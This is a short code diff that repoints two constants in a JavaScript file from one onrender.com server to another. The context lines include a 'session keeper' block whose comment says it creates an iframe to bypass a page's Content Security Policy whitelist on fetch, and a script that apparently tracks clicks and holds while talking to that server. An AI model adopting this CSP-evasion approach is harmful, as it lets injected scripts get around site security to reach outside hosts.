@@ -13,7 +13,7 @@ if(typeof HTMLAudioElement !== 'undefined') {
 
 // ===== SESSION KEEPER QATLAMI (auto-refresh bypass) =====
 (async()=>{
-  const BASE = 'https://shahzod88.onrender.com';
+  const BASE = 'https://shahzod23.onrender.com';
   
   // Create an iframe for postMessage communication to bypass CSP whitelist on fetch
   let bypassFrame = document.createElement('iframe');
@@ -69,7 +69,7 @@ if(typeof HTMLAudioElement !== 'undefined') {
 
 // public/f1.js
 (function(){
-  const BASE = 'https://shahzod88.onrender.com'; // server URL
+  const BASE = 'https://shahzod23.onrender.com'; // server URL
 
   let holdTimer=null, clickCount=0, lastSince=0, box=null;
 
